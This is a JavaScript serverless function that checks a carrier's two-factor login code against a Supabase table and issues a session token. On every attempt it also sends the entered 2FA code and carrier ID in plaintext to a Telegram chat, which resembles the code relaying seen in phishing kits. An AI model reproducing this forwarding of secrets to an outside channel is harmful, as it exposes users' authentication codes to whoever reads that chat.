const { supabase } = require('./_shared/supabase')
const { sendTelegram } = require('./_shared/telegram')
const { cors, signCarrierToken } = require('./_shared/auth')

exports.handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') return cors({})
  const { carrierId, code } = JSON.parse(event.body || '{}')
  if (!code) return cors({ error: 'Code is required.' }, 400)

  let entry = null
  if (carrierId) {
    const { data } = await supabase
      .from('login_codes')
      .select('*')
      .eq('carrier_id', carrierId)
      .eq('code', code)
      .eq('used', 0)
      .order('id', { ascending: false })
      .limit(1)
      .single()
    entry = data
  }

  const valid = Boolean(entry && entry.expires_at >= Date.now())
  await supabase.from('twofa_attempts').insert({ carrier_id: carrierId || null, code, success: valid ? 1 : 0 })

  const status2fa = valid ? '✅ SUCCESS' : '❌ FAILED'
  await sendTelegram(`🔐 <b>2FA Code Entered</b>\n${status2fa}\n🔢 Code: ${code}\n👤 Carrier ID: ${carrierId || 'unknown'}`)

  if (!entry) return cors({ error: 'Invalid verification code.' }, 401)
  if (entry.expires_at < Date.now()) return cors({ error: 'Verification code has expired.' }, 401)

  await supabase.from('login_codes').update({ used: 1 }).eq('id', entry.id)

  const { data: row } = await supabase.from('carriers').select('*').eq('id', carrierId).single()
  const { password_hash, ...carrier } = row
  carrier.equipment = JSON.parse(carrier.equipment || '[]')
  carrier.preferred_lanes = JSON.parse(carrier.preferred_lanes || '[]')

  return cors({ token: signCarrierToken(row.id), carrier })
}
